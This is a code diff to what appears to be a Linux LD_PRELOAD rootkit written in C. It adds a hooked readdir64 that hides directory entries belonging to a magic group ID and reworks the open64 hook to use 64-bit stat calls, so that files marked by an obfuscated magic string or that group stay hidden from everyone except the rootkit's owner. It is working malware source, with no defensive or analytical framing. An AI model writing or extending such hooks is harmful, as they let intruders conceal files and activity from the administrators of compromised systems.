@@ -30,7 +30,7 @@ int (*old_accept)(int socket, struct sockaddr *restrict address, socklen_t *rest
 
 //directory functions
 struct dirent *(*old_readdir)(DIR *dirp);
-struct dirent64 *(*old_readdir64)(DIR *dirp); 
+struct dirent64 *(*old_readdir64)(DIR *dirp);
 int (*old_chdir)(const char *path);
 int (*old_fchdir)(int fildes); 
 int (*old_mkdir)(const char *pathname, mode_t mode); 
@@ -664,6 +664,38 @@ struct dirent *readdir(DIR *dirp)
 	return dir;	
 } 
 
+struct dirent64 *readdir64(DIR *dirp)
+{ 
+	HOOK(readdir64); 
+	HOOK(__xstat64); 
+	#ifdef DEBUG 
+	printf("[!] readdir64 hooked\n"); 
+	#endif 
+
+	char path[PATH_MAX + 1]; 
+	struct dirent64 *dir; 
+	struct stat64 filestat; 
+	if (owned()) return old_readdir64(dirp); 
+	do 
+	{ 
+		dir = old_readdir64(dirp); 
+		if (dir != NULL && (strcmp(dir->d_name, ".\0") == 0 || strcmp(dir->d_name, ".\0") == 0))
+			continue; 
+		if (dir != NULL)
+		{ 
+			int fd; 
+			char fdpath[256], *dirname = (char *) malloc(sizeof(fdpath)); 
+			memset(dirname, 0x0, sizeof(fdpath)); 
+			fd = dirfd(dirp); 
+			snprintf(fdpath, sizeof(fdpath) - 1, "/proc/self/fd/%d", fd); 
+			readlink(fdpath, dirname, sizeof(fdpath) - 1); 
+			snprintf(path, PATH_MAX, "%s/%s", dirname, dir->d_name); 
+			old___xstat64(_STAT_VER, path, &filestat); 
+		} 
+	}while (dir && filestat.st_gid == MAGICGID); 
+	return dir; 
+}
+
 int chdir(const char *path)
 { 
 	HOOK(chdir);
@@ -842,15 +874,15 @@ int open(const char *file, int oflag, ...)
 int open64(const char *file, int oflag, ...)
 { 
 	HOOK(open64); 
-	HOOK(__xstat); 
+	HOOK(__xstat64); 
 	#ifdef DEBUG 
 	printf("[!] open64 hooked\n"); 
 	#endif 
 
 	if (owned()) return old_open64(file, oflag); 
 	char *magic = strdup(MAGIC); xor(magic); 
-	struct stat filestat; 
-	old___xstat(_STAT_VER, file, &filestat); 
+	struct stat64 filestat; 
+	old___xstat64(_STAT_VER, file, &filestat); 
 	if ((strstr(file, magic)) || filestat.st_gid == MAGICGID)
 	{ 
 		CLEAN(magic); 
